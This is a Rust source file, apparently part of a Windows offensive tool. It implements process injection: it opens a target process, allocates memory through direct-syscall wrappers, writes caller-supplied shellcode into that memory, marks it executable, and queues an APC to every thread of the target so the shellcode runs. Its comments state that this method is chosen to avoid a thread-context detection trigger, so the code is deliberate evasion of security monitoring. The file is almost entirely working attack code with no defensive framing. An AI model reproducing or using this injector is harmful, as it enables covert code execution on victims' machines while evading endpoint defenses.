#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32,
            TH32CS_SNAPTHREAD,
        },
        Threading::{
            OpenThread, SuspendThread, ResumeThread,
            THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
            THREAD_QUERY_INFORMATION,
        },
    },
};

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

// Hijack: queue APC to all threads in the target process rather than calling
// SetContextThread — avoids the thread-context-set detection trigger.
#[cfg(target_os = "windows")]
pub fn inject_hijack(pid: u32, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_queue_apc};
    use core::ptr::null_mut;

    let proc = super::open_process_rw(pid)
        .map_err(|st| format!("open failed ({st:#010x})"))?;

    let mut base: *mut u8 = null_mut();
    let mut alloc_size: usize = shellcode.len().max(0x1000);
    let status = unsafe {
        nt_alloc(proc, &mut base, 0, &mut alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };
    if status < 0 || base.is_null() {
        unsafe { CloseHandle(proc as _) };
        return Err("alloc failed".into());
    }

    let mut written: usize = 0;
    let status = unsafe {
        nt_write(proc, base, shellcode.as_ptr(), shellcode.len(), &mut written)
    };
    if status < 0 {
        unsafe { CloseHandle(proc as _) };
        return Err("write failed".into());
    }

    let mut old_prot: u32 = 0;
    let mut prot_base = base;
    let mut prot_size = alloc_size;
    unsafe { nt_protect(proc, &mut prot_base, &mut prot_size, PAGE_EXECUTE_READ, &mut old_prot) };

    // Queue APC to all threads in target — no new thread, no SetContextThread.
    let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if snap == INVALID_HANDLE_VALUE {
        unsafe { CloseHandle(proc as _) };
        return Err("snapshot failed".into());
    }

    let mut entry: THREADENTRY32 = unsafe { core::mem::zeroed() };
    entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
    let mut queued = 0u32;

    if unsafe { Thread32First(snap, &mut entry) } != 0 {
        loop {
            if entry.th32OwnerProcessID == pid {
                let th = unsafe {
                    OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, entry.th32ThreadID)
                };
                if th != 0 {
                    unsafe {
                        nt_queue_apc(th as isize, base as *const u8, null_mut(), null_mut(), null_mut());
                        CloseHandle(th);
                    }
                    queued += 1;
                }
            }
            entry = unsafe { core::mem::zeroed() };
            entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
            if unsafe { Thread32Next(snap, &mut entry) } == 0 {
                break;
            }
        }
    }
    unsafe { CloseHandle(snap as _); CloseHandle(proc as _); }

    if queued == 0 {
        Err("no threads in target".into())
    } else {
        Ok(())
    }
}
